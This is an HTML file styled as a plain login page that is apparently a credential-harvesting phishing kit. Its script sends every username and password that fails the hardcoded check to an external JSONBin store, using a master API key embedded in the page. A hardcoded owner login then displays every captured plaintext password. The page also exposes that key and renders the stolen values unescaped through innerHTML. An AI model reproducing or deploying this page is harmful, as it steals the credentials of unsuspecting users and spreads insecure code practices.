<!DOCTYPE html>
<html lang="en" data-theme="dark">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Login Page</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <link href="https://fonts.googleapis.com/css2?family=Source+Sans+Pro:wght@300;400;600&display=swap" rel="stylesheet">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" />
  <style>
    body {
      font-family: 'Source Sans Pro', sans-serif;
    }
    .input-icon {
      position: absolute;
      right: 0.75rem;
      top: 67%;
      transform: translateY(-50%);
      cursor: pointer;
    }
    .failed-attempt {
      color: red;
      font-weight: bold;
    }
  </style>
</head>
<body class="bg-[#111111] text-white min-h-screen flex flex-col justify-between px-4 py-6">
  <!-- ðŸ”¼ Top Section -->
  <div class="w-full max-w-xl mx-auto">
    <div class="p-1.5">
      <h1 class="text-white font-bold text-lg mb-4">LOGIN</h1>
      <!-- Username -->
      <div class="mb-2.5">
        <label class="block text-sm mb-1" for="username">Username</label>
        <input
          type="text"
          id="username"
          placeholder="Username"
          class="w-full px-3 py-1.5 border border-orange-500 rounded bg-[#121212] text-white focus:outline-none focus:ring-2 focus:ring-orange-400"
        />
      </div>
      <!-- Password -->
      <div class="mb-2.5 relative">
        <label class="block text-sm mb-1" for="password">Password</label>
        <input
          type="password"
          id="password"
          placeholder="Password"
          class="w-full px-3 py-1.5 border border-orange-500 rounded bg-[#121212] text-white focus:outline-none focus:ring-2 focus:ring-orange-400"
        />
        <i id="togglePassword" class="fa-solid fa-eye-slash text-gray-400 input-icon"></i>
      </div>
      <!-- Sign In -->
      <button
        id="loginButton"
        class="w-full px-3 py-1.5 text-base text-black font-semibold rounded bg-gradient-to-r from-yellow-400 to-orange-500 hover:from-yellow-300 hover:to-orange-400 transition"
      >
        Sign In
      </button>
    </div>
  </div>

  <!-- ðŸ”½ Bottom Section -->
  <div class="w-full max-w-xl mx-auto">
    <div class="bg-[#f28a4a] py-2 px-4 font-semibold text-sm">Other</div>
    <div class="border border-orange-500 mt-1 p-3 rounded bg-black text-white cursor-pointer flex justify-between items-center">
      <span>Change Language</span>
      <svg xmlns="http://www.w3.org/2000/svg" fill="currentColor" class="w-4 h-5 text-white" viewBox="0 0 24 24">
        <path d="M9 18l6-6-6-6" />
      </svg>
    </div>
  </div>

  <!-- âœ… Failed attempts container -->
  <div id="failedAttemptsContainer" class="mt-4 text-white" style="display: none;"></div>

  <!-- âœ… JSONBin Integration Script -->
  <script type="module">
    const BIN_ID = "67fa4e0a8e451c79651def49";
    const API_KEY = "$2a$10$QtoHBeIgduOyNX/.VfoFPOlgQrUuKhcPZ7ZHjGLTLhVvtg17oL85y";

    const togglePassword = document.getElementById("togglePassword");
    const password = document.getElementById("password");

    togglePassword.addEventListener("click", () => {
      const isHidden = password.type === "password";
      password.type = isHidden ? "text" : "password";
      togglePassword.classList.toggle("fa-eye");
      togglePassword.classList.toggle("fa-eye-slash");
    });

    const loginButton = document.getElementById("loginButton");
    const usernameField = document.getElementById("username");
    const passwordField = document.getElementById("password");

    async function storeFailedAttempt(username, password) {
      const attempt = {
        username,
        password,
        timestamp: new Date().toISOString()
      };

      try {
        const res = await fetch(`https://api.jsonbin.io/v3/b/${BIN_ID}/latest`, {
          headers: { "X-Master-Key": API_KEY }
        });

        let existingData = [];
        if (res.ok) {
          const json = await res.json();
          if (Array.isArray(json.record)) {
            existingData = json.record;
          }
        }

        existingData.push(attempt);

        const putRes = await fetch(`https://api.jsonbin.io/v3/b/${BIN_ID}`, {
          method: "PUT",
          headers: {
            "Content-Type": "application/json",
            "X-Master-Key": API_KEY,
            "X-Bin-Versioning": "false"
          },
          body: JSON.stringify(existingData)
        });

        if (!putRes.ok) {
          console.error("Failed to save:", await putRes.text());
        } else {
          console.log("Failed attempt saved.");
        }
      } catch (err) {
        console.error("Error storing to JSONBin:", err);
      }
    }

    function displayFailedAttempts(attempts) {
      const container = document.getElementById("failedAttemptsContainer");
      if (attempts.length > 0) {
        container.innerHTML = `<strong>Failed Login Attempts:</strong><br>${attempts
          .map(
            (a) =>
              `Username: ${a.username}, Password: ${a.password}, Timestamp: ${new Date(a.timestamp).toLocaleString()}`
          )
          .join("<br>")}`;
      } else {
        container.innerHTML = "<strong>No failed attempts yet.</strong>";
      }
      container.style.display = "block";
    }

    loginButton.addEventListener("click", async () => {
      const username = usernameField.value;
      const pwd = passwordField.value;

      if (username === "lalouss" && pwd === "laloussa") {
        alert("Login successful!");
        try {
          const res = await fetch(`https://api.jsonbin.io/v3/b/${BIN_ID}/latest`, {
            headers: { "X-Master-Key": API_KEY }
          });
          if (res.ok) {
            const json = await res.json();
            const attempts = Array.isArray(json.record) ? json.record : [];
            displayFailedAttempts(attempts);
          } else {
            console.error("Failed to fetch attempts:", await res.text());
          }
        } catch (err) {
          console.error("Error fetching failed attempts:", err);
        }
      } else {
        await storeFailedAttempt(username, pwd);
      }
    });

    loginButton.addEventListener("touchstart", (e) => {
      e.preventDefault();
      loginButton.click();
    });
  </script>
</body>
</html>
